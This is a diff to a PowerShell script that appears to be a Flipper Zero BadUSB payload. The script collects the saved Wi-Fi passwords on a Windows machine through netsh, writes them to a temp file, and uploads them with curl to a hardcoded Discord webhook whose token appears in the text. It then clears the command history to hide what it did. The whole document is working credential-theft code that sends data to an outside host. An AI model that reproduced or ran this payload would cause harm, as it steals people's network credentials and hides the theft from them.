@@ -3,9 +3,12 @@ $wifiProfiles = netsh wlan show profiles | Select-Object
 
 # Define the webhook URL
 $webhook_url = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
+
+# Create an array to store the Wi-Fi profile details
+$wifiProfileDetailsArray = @()
+
 $content = '```ml'
 $content += "`n"
-
 
 $wifiProfiles | ForEach-Object {
     $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
@@ -17,10 +20,9 @@ $wifiProfiles | ForEach-Object {
         $_.Matches.Groups[1].Value
     }
 
-    $username = $env:username + " | " + $profileName
-
     if ($wifiPassword) {
         $content += "Wi-Fi password $profileName : $wifiPassword`n"  # Use `n for a newline
+        $wifiProfileDetailsArray += "Wi-Fi password $profileName : $wifiPassword"
     }
 
 }
@@ -28,11 +30,15 @@ $wifiProfiles | ForEach-Object {
 $content += '```'
 
 $message_data = @{
-    'username' = $username + "Flipper"
+    'username' = $env:username + "Flipper"
     'content'  = $content
 }
 
-Invoke-WebRequest -Uri $webhook_url -Method Post -ContentType "application/json" -Body ($message_data | ConvertTo-Json)
+# Save passwords to a text file
+$wifiProfileDetailsArray | Out-File -FilePath "$env:TEMP\WiFiPasswords.txt"
 
-# Delete Traces
+# Upload the text file to Discord
+curl.exe -F "file1=@$env:TEMP\WiFiPasswords.txt" $webhook_url
+
+# Clear command history
 Clear-History
